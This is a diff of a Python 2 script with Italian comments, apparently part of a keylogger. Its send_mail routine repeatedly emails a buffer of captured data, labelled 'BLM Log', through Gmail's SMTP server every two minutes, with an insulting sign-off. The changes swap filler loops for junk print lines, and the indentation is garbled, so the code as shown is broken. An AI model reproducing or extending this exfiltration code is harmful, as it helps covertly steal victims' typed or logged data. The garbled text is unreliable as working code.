@@ -34,18 +34,13 @@ if not path.isfile(dir):
     
 def send_mail():
     global data
-	for i in xrange(2):
-		print "yay"
+	print "yay"
     while True:
-		for j in xrange(10):
-			print "lol"
-	# FILE
+		print "lol"
+		# FILE
         if len(data) > 25:
-		# MAI
-			for k in xrange(5):
-				if k == 2:
-					break
-            timeInSecs = datetime.datetime.now()
+			# MAI
+		    timeInSecs = datetime.datetime.now()
             # VISTO
 			SERVER = "smtp.gmail.com"
             # PRIMA
@@ -58,6 +53,7 @@ def send_mail():
             FROM = USER
 			# GIURO
             TO = [USER]
+			print "adasda"
             SUBJECT = "BLM Log di: " + timeInSecs.isoformat() 
             MESSAGE =  data + "\r\n\n\nGrazie per aver utilizzato il nostro servizio e vaffanculo a te e tua madre."
 
@@ -75,9 +71,7 @@ def send_mail():
                 server.sendmail(FROM, TO, message_payload)
                 data = ''
                 server.quit()
-				for l in xrange(5):
-					if l == 3:
-						break
+				print "tummamma"
             except Exception as error:
                 print "fak"
         sleep(120)
